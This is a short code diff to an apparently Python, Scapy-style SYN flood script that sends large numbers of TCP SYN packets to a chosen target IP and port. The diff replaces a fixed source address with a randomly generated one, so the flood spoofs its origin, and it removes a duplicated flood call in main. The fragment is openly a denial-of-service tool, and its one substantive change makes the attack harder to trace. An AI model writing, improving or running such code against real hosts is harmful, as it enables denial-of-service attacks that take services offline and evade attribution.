@@ -28,7 +28,7 @@ def SYN_Flood(dstIP, dstPort, counter):
         w_indow = randInt()
 
         IP_Packet = IP()
-        IP_Packet.src = '192.168.1.100'
+        IP_Packet.src = randomIP()
         IP_Packet.dst = dstIP
 
         TCP_Packet = TCP()
@@ -53,8 +53,6 @@ def info():
 def main():
     dstIP, dstPort = info()
     counter = 10000
-    SYN_Flood(dstIP, dstPort, int(counter))
-
     SYN_Flood(dstIP, dstPort, int(counter))
 
 
